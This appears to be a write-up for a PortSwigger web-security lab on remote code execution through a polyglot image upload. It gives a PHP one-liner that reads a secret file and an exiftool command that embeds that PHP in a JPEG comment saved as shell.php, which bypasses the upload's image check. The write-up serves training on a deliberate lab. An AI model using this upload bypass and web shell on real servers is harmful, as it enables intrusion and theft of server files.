# Lab-6: [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

**Aim :-** To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: ``` wiener:peter ```



## Solution
- Login as ``` wiener ```.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- There will be a option to upload image.

- Copy the following code and save it in a file, name it as ``` exploit.php ```.
    - ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```.

- Try uploading the file.

- Server will respond with ``` Error: file is not a valid image Sorry, there was an error uploading your file.```

- Create a **Steganographic image** image with the php code in it.
    - A **steganographic image** (often called a "stego image") is a digital image that contains hidden information—such as text, another image, or even a malicious file—without visibly changing its appearance.

- Open a kali linux terminal and execute the following command to create a steganographic image.
    - ``` exiftool -Comment="<?php echo ' SECRET CODE IS :- '.file_get_contents('/home/carlos/secret')  ; ?>" IMAGE-NAME.jpg -o shell.php ```

    - This will create a ``` shell.php ``` image file with php code.

- Upload the ``` shell.php ``` file.

- View the image by going to ``` /files/avatars/shell.php ```.

- Copy the secret code and submit it as solution ( secret code will be followed by ``` SECRET CODE IS :- ``` ).
